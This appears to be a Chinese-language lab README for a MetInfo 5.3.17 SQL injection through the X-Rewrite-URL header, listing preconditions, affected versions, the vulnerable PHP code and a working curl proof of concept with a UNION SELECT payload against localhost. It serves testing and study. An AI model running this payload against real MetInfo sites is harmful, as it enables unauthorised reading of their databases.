## 特殊说明

后台地址 `http://127.0.0.1/admin/`

## X-Rewrite-URL SQL注入

测试镜像

* src/metinfo/5.3.17/

要求

* 管理员在 `营销 -> SEO` 下面，开启伪静态
* 管理员安装了至少两种语言包，只安装中文会导致 `$lang` 被覆盖，无法注入

影响版本

* <= 5.3.17

参考链接

* [Metinfo 5.3.17 前台SQL注入漏洞分析](https://paper.seebug.org/371/)

Poc

```
curl -I 'http://127.0.0.1/index.php?lang=Cn&index=xxxx' -H "X-Rewrite-URL: 'and 1=2 union select version(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php"
```

关键代码

```
# config/config.inc.php
$met_index_type = $db->get_one("SELECT * FROM $met_config WHERE name='met_index_type' and lang='metinfo'");

..

if(count($met_langok)==1)$lang=$met_index_type;

# include/global.func.php
$dir_dirname=$dirs[count($dirs)-2];

...

if($lang==$met_index_type){
	
	...

} else {

	...

$query="select * from $met_column where foldername='$dir_dirname' and lang='$lang' and (classtype='1' or releclass!='0') order by id asc";

	...
```

